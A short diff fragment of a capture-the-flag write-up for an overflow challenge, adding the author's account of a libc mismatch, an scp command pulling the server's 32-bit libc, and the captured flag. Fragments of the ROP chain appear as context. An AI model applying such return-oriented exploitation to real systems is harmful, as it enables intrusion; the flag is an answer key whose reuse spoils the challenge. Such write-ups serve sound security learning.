@@ -90,6 +90,15 @@ rop.raw(vuln) # filler
 rop.raw(sh_str)
 ```
 
+Too bad it failed for me and it took me more than 10 hours to realise that the libc the server uses is for amd, whilst the one they gave us is for intel. So I had to do one more step:
+
+```bash
+scp -P 60220 bot@18.136.182.104:/usr/lib32/libc.so.6 .
+mv libc.so.6 amd_libc.so.6
+```
+
+And it finally worked...
+
 ```bash
 $ cat flag.txt
 CDDC21{Y0u_OverFlow_1T}
